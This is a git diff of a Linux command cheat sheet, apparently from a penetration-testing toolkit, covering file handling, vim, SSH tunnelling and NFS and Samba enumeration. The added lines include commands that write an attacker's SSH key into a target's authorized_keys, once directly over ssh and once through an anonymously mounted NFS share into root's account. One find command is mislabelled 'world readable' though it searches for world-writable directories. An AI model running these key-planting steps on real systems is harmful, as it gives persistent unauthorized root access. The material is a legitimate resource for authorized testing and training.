@@ -22,21 +22,21 @@ zip -9 test.zip test
 zip -r test.zip test/
 ------------------------------------------------------------------------------------------------------ 
 
-# Copy Files
+# Copy Files (Remotely)
  
-Local to remote
-scp /path/to/local/file.txt user@targetIP:/path/to/share
-scp discover.sh root@192.168.1.10:/opt/scripts
- 
-Remote to local
-scp -r user@targetIP:/path/to/share /local/share
-scp -r root@192.168.1.11:/root/metasploit.xml /root/
+scp /path/to/local/file.txt user@targetIP:/path/to/share     Local to remote
+scp -r user@targetIP:/path/to/share /local/share             Remote to local
+
+# Append File (Remotely)
+
+cat ~/.ssh/id_rsa.pub | ssh user@targetIP 'cat >> .ssh/authorized_keys'
 ------------------------------------------------------------------------------------------------------
  
 # File Permissions
  
 t rwx rwx rwx	 type / owner / group / world
 Type is directory (d) or file (-).
+
 read    (r)	 4
 write   (w)	 2
 execute (e)	 1
@@ -67,12 +67,14 @@ mkdir tmp                          Create a directory called tmp
 touch tmp                          Create a file called tmp
 
 cat tmp                            Show the contents of tmp
-cat > tmp                          Create a file called tmp
-cat >> tmp                         Append text to a file called tmp
+ifconfig > tmp                     Pipe the output of a command to a file
+cat tmp >> tmp2                    Append the contents of a file (tmp) to another file (tmp2)
 
 head tmp                           Show the first 10 lines of tmp
 head -20 tmp                       Show the first 20 lines of tmp
-more tmp                           Show the contents of tmp, one page at a time. Space bar for next page. q to exit
+more tmp                           Show the contents of tmp, one page at a time. 
+                                   Space bar for next page and q to exit
+                                   
 tail tmp                           Show the last 10 lines of tmp
 tail -20 tmp                       Show the last 20 lines of tmp
 tail -f tmp                        Show the file contents as it grows
@@ -81,9 +83,10 @@ tail -f tmp                        Show the file contents as it grows
 # Finding Files
 
 updatedb                           Update the database of file names on the system
-locate file                        Reads a list of files from the database and show the location of a file
-which app                          Show the path where the app is executed
+locate file                        Reads the database and shows the location of a file
+which app                          Show the path where the app is executed from
 find / -name sbd*                  Show all the files that start with sbd
+find / -perm -o+w -type d 2>/dev/null  Show all world readable directories
 ------------------------------------------------------------------------------------------------------
 
 # Installation
@@ -95,13 +98,15 @@ make install
 dpkg -i app.deb                    Install Debian package
 rpm -Uvh app.rpm                   Install RPM package
 
-dpkg-query -l                     Show a list of installed packages
+dpkg-query -l                      Show a list of installed packages
+
+pip install -r requirements.txt    Install required packages listed in a file
 ------------------------------------------------------------------------------------------------------
 
 # Integrity
 
-md5sum test.iso                    MD5
-sha1sum test.iso                   SHA1
+md5sum test.iso                    MD5 hash
+sha1sum test.iso                   SHA1 hash
 ------------------------------------------------------------------------------------------------------
 
 # Networking
@@ -139,7 +144,7 @@ gateway 192.168.2.1
 
 kill -9 <PID>                      Kill process ID
 killall <service>                  Kill all processes named service
-ps aux                             Currently active processes
+ps aux                             Active processes
 top                                Running processes
 ------------------------------------------------------------------------------------------------------
 
@@ -148,13 +153,6 @@ top                                Running processes
 Add to /root/.bashrc
 export http_proxy=http://username:password@proxy:port
 export https_proxy=https://username:password@proxy:port
-
-git clone https://github.com/leebaird/discover.git /opt/discover/
-
-nano /root/.subversion/servers
-[global]
-http-proxy-host = proxy
-http-proxy-port = port
 ------------------------------------------------------------------------------------------------------
 
 # Searching within files
@@ -169,16 +167,16 @@ zgrep                              Search for a pattern in a zip file
 ssh into a remote system
 screen -S test                     Start a new screen session named test
 top                                Example command, leave it running
-ctrl A  ctrl D                     Detach from the screen session
-screen -ls                         Show all screen sessions running
-screen -DR test                    Reconnect to the session
+ctrl A  ctrl D                     Detach from the session
+screen -ls                         Show all sessions running
+screen -DR test                    Reconnect to a session
 exit                               Leave and close the session
 ------------------------------------------------------------------------------------------------------
 
 # Shortcuts
 
 ctrl + alt + t                     Open a Terminal
-ctrl + shift + t                   Open a new tab
+ctrl + shift + t                   Open a new tab in Terminal
 ctrl + a                           Go to the beginning of the line
 ctrl + l                           Clear the screen
 ------------------------------------------------------------------------------------------------------
@@ -186,13 +184,28 @@ ctrl + l                           Clear the screen
 # SSH
 
 ssh-keygen                         Generate new public/private key pair
-ssh root@host                      Connect to host as root
-ssh -p 222 root@host               Connect to host on port 222 as root
-/etc/ssh/sshd_config               Change port that the server is listening on or allow root login
 
-mv amazon.pm /root/.ssh/           Move new Amazon private key to SSH folder
-chmod 600 /root/.ssh/amazon.pem    Change permissions of key
-ssh -i amazon.pem kali@host        Connect to Amazon EC2 as kali with key
+ssh user@targetIP                  Connect on a standard port
+ssh user@targetIP -p 2222          Connect on a non-standard port
+ssh user@targetIP -i file.pem      Connect and authenticate using an identity file
+ssh user@targetIP -L 5900:localhost:5900     Connect and use local port forwarding
+
+ssh user@targetIP -C -D 1080 -N    -C  Use compression
+                                   -D  Create a SOCKS tunnel on the default port
+                                   -N  Do not execute a remote command
+
+Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
+Remove everything for HTTP, SSL, and FTP proxies and ports
+SOCKS Host: 127.0.0.1   Port: 1080
+Select SOCKS v5 and Remote DNS
+
+/etc/ssh/ssh_config                Config file
+ForwardX11 yes                     Uncomment and change to yes
+ForwardX11Trusted yes              Uncomment
+
+export DISPLAY=localhost:0.0
+exit
+ssh user@targetIP -Y               Connect and use X11 forwarding
 ------------------------------------------------------------------------------------------------------
 
 # Startup Services
@@ -230,7 +243,7 @@ whoami                             Who you are logged in as
 
 /etc/passwd                        User accounts
 /etc/shadow                        Encrypted passwords
-id                                 User/group permissions
+id                                 User and group permissions
 
 passwd                             Change root password
 passwd <user>                      Change another user's password
@@ -249,17 +262,20 @@ groupmod                           Modify group
 adduser <user> <group>             Add user to group
 ------------------------------------------------------------------------------------------------------
 
-# vi
+# vim
 
-vi filename                        Open an existing file
-vi newfile                         Create a new file
+vim filename                       Open an existing file
+vim newfile                        Create a new file
 
-Modes                              Command, append, insert and replace
+vim vimrc                          Setup config file in home directory
+     syntax on
+     set wrapmargin=8
+     set number
+
+Modes                              Command, Insert, Append, and Replace
 
 Command mode
-The letters of the keyboard perform editing functions. To enter press <Esc>.
-
-Moving around
+dd                                 Delete entire line
 h                                  Left
 j                                  Down
 k                                  Up
@@ -273,43 +289,70 @@ G                                  Last line of file
 
 <esc> u                            Undo
 
-Append mode
-To add text to the end of a line.
-Position the cursor on the last letter of the line.
-Type a
-Enter new text.
-This adds text AFTER the cursor. Press <esc> to return to command mode.
-
 Insert mode
-The letters you type form words and sentences.
 Position the cursor where the new text should go.
-Type i
+i
 Enter new text.
-This adds text BEFORE the cursor. Press <esc> to return to command mode.
+Press <esc> to return to command mode.
+
+Append mode
+Position the cursor on the last letter of the line.
+a
+Enter new text. This adds text AFTER the cursor. 
+Press <esc> to return to command mode.
 
 Replace mode
-To replace one character with another.
 Move the cursor to the character to be replaced.
-Type r
-Enter the replacement character. Press <esc> to return to command mode.
+r
+Enter the replacement character.
+Press <esc> to return to command mode.
 
 Search
-Type /
+/
 Enter the search string.
-<Return>
-n	Search forward.
-N	Search backward.
+<return>
+n	Search forward
+N	Search backward
 
-Save changes to a file
+Write changes to a file
 <esc>
 :w
-<Return>
+<return>
+
+Write changes to a file and quit
+<esc>
+:wq
+<return>
 
 Quit
 <esc>
 :q
 
-Don't save and quit
+Do not save and quit
 <esc>
 :q!
 <Return>
+------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+
+# NFS Shares Anonymous Mountable
+
+showmount -e <target IP>
+
+mkdir /mnt/tmp/
+mount -t nfs -o nolock <target IP>:/share /mnt/tmp/
+
+OS X: mount -t cifs //<target IP>:Users/<user name> /mnt/tmp/ -o user=<user name>,pass=<password>,nounix,sec=ntlmssp
+
+cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
+umount /tmp/mount
+------------------------------------------------------------------------------------------------------
+
+# Rstatd enabled
+
+rsysinfo <target IP>
+------------------------------------------------------------------------------------------------------
+
+# Samba with a writeable file share
+
+smbclient -L //<target IP>
